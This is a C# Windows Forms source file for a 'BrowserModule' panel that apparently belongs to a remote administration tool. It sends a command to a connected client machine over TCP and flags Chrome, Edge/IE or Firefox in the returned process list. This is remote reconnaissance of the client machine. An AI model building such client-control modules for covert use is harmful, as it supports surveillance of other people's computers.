using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Cliente;
using Server.Conexion;
using Server.Log;

namespace Server
{
    public partial class BrowserModule : Form
    {
        public static BrowserModule Instance { get; private set; }
        private TcpClient _cliente;
        private int _idCliente;

        private static Logger _logger = Logger.getInstance();
        public BrowserModule(int id, TcpClient cliente)
        {
            InitializeComponent();
            Instance = this;
            _cliente = cliente;
            _idCliente = id;
        }

        private void BrowserModule_Load(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "a", Channel.BrowserModule);

        }


        public void detectarNavegadores()
        {

            if (textBox1.Text.Contains("chrome.exe")){

                pictureBox1.Visible = true;

            }else if(textBox1.Text.Contains("iexplore.exe") && textBox1.Text.Contains("msedge.exe")) {


                pictureBox2.Visible = true;


            }
            else if (textBox1.Text.Contains("firefox.exe"))
            {


                pictureBox3.Visible = true;


            }




        }


        public void AppendBrowsers(string output)
        {

            InvokeIfRequired(textBox1, () =>
            {

                textBox1.AppendText(output);
                detectarNavegadores();
            });

        
        }
        
            
            
        

        private void InvokeIfRequired(Control ctl, Action action)
        {
            if (ctl.InvokeRequired)
                ctl.Invoke(action);
            else
                action();
        }
    }
}
